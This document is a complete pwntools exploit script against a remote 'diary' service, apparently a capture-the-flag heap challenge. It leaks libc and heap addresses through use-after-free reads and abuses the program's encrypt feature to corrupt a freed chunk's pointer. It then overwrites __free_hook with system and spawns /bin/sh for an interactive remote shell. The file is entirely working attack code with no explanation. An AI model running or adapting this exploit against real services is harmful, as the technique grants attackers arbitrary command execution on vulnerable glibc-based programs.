from pwn import *

def add(year,month,day,hour,minutes,sec,content):
    p.recvuntil("cmd:")
    cmd = 'add#'
    cmd += str(year) + '#' + str(month) + '#' + str(day) + '#' + str(hour) + '#' + str(minutes) + '#' + str(sec) + '#' + content
    p.sendline(cmd)


def show(idx):
    p.recvuntil("cmd:")
    cmd = 'show#' + str(idx)
    p.sendline(cmd)


def delete(idx):
    p.recvuntil("cmd:")
    cmd = 'delete#' + str(idx)
    p.sendline(cmd)

def update(idx,content):
    p.recvuntil("cmd:")
    cmd = 'update#' + str(idx) + '#' + content
    p.sendline(cmd)

def decrypt(idx):
    p.recvuntil("cmd:")
    cmd = 'decrypt#' + str(idx)
    p.sendline(cmd)

def encrypt(idx,offset,length):
    p.recvuntil("cmd:")
    cmd = 'encrypt#' + str(idx) + '#' + str(offset) + '#' + str(length)
    p.sendline(cmd)

# p = process("./diary")

p = remote("119.13.105.35",10111)

# gdb.attach(p)


for i in range(11):
    add(1971,12,12,23,22,20+i,'a'*0x200)

for i in range(10,3,-1):
    delete(i)

delete(0)

show(2)

p.recvuntil("1971.12.12 23:22:23\n")

leak_value = u64(p.recv(6).ljust(8,b'\x00'))

info("leak_value: " + hex(leak_value))

__free_hook_ = leak_value + 0x2268 - 0xd
system = leak_value - 0x19a950

for i in range(5):
    add(1971,12,12,23,22,40+i,'a'*0x200)

delete(0)
show(6)
p.recvuntil("23:22:44\n")
heap_value = u64(p.recv(6).ljust(8,b'\x00'))

info("heap_value: " + hex(heap_value))


need_random_value = heap_value ^ __free_hook_

for i in range(6):
    update(0,chr(need_random_value&0xff)*0x200)
    encrypt(0,4,0x200)
    show(0)
    data = p.recvuntil("input")
    data = data[:-6]
    data = data[25:]
    if len(data) == 0x200:
        exit()
    update(0,"A"*0x200)
    encrypt(0,0,len(data))
    encrypt(6,i,1)
    update(0,"A"*0x200)
    encrypt(0,0,511-len(data))
    need_random_value = need_random_value >> 8


add(1972,12,12,23,22,40,'a'*0x10)

pause()

add(1972,12,12,23,22,41,';/bin/sh;' + ''.join([chr(x) for x in p64(system)]))


p.interactive()